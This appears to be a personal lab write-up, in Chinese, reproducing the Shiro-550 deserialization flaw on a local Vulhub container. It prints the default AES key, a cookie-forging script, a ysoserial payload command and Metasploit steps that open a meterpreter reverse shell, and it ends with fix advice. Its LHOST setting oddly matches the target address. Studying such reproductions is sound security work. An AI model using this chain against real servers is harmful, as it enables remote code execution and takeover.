# CVE-2016-4437 Shiro-550 复现笔记
> 本地 Vulhub | 2026.08.25
---
## 漏洞说明
Shiro 1.2.4 及之前版本，`rememberMe` 用了固定 AES 密钥：
```
kPH+bIxk5D2deZiIxcaaaA==
```

知道密钥就能自己拼 Cookie 发过去，服务端反序列化后执行命令。就两个关键点：密钥硬编码 + 反序列化。
---
## 环境
| 项目 | 内容 |
|------|------|
| 攻击机 | Kali Linux |
| 靶场 | Vulhub shiro 1.2.4 |
| 靶机 | http://192.168.1.81:8080 |
| 工具 | Burp Suite、ysoserial、Python、msf |
---
## 手动复现过程
### 1. ![启动docker环境](./images/1-docker-up.png)

```
cd vulhub-master/shiro/CVE-2016-4437
docker-compose up -d
```

### 2. 验证漏洞

浏览器访问登录页，抓响应包，看到 `Set-Cookie: rememberMe=deleteMe`，说明 rememberMe 功能是开着的。

[https://./screenshots/2-login-page.png](https://./screenshots/2-login-page.png)

### 3. 生成恶意 Cookie

Shiro Cookie 生成逻辑：

1. 序列化 payload
    
2. AES-CBC 加密（密钥固定）
    
3. IV 拼在最前面（16 字节全零）
    
4. 整体 Base64
    

加密脚本如下：

python

import base64
from Crypto.Cipher import AES
KEY = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
def make_shiro_cookie(data):
    iv = b'\x00' * 16
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    pad_len = 16 - len(data) % 16
    data += bytes([pad_len]) * pad_len
    encrypted = cipher.encrypt(data)
    return base64.b64encode(iv + encrypted).decode()

生成 payload：

```
java -jar ysoserial-all.jar CommonsCollections2 "id" > payload.ser
```

执行脚本后得到 Base64。

<img width="1280" height="763" alt="4-burp-send" src="https://github.com/user-attachments/assets/a4ee97dd-095b-406c-b25b-e6aa1bf0a37c" />


### 4. Burp 发送

抓个请求，Cookie 改成 `rememberMe=刚才那串Base64`，发出去。


## 卡住了

返回 302，`rememberMe` 被清掉：

Set-Cookie: rememberMe=deleteMe
Location: /login

说明反序列化失败了。换了几个链都这样：

|链|结果|
|---|---|
|CommonsCollections1|302|
|CommonsCollections2|302|
|CommonsBeanutils1|302|
|Jdk7u21|302|

应该是靶机缺对应的依赖库，类加载失败被 Shiro catch 住了。手动折腾了挺久没打通。

## 改用 msf 收尾

手动一直卡在 302，换 msf 试了一下：

msfconsole
use exploit/multi/http/shiro_rememberme_v122
set RHOSTS 192.168.1.81
set RPORT 8080
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.81
run

跑通，拿到 shell。


虽然手动没成，但至少确认漏洞是真实存在的，只是链没选对或者环境缺东西。

## 修复建议

- 升级 Shiro 到 1.2.5 以上，官方已经把硬编码密钥去掉了
    
- 如果没法升级，换掉默认密钥，自己生成随机值
    
- 用不上 `rememberMe` 就关了
    

## 记录几点

- Shiro Cookie 加密流程清楚了（密钥、IV、Base64 那块）
    
- 反序列化链不是通用的，依赖目标环境
    
- 302 + deleteMe 基本就是反序列化报错了
    
- 手动搞不定就换工具，别死磕
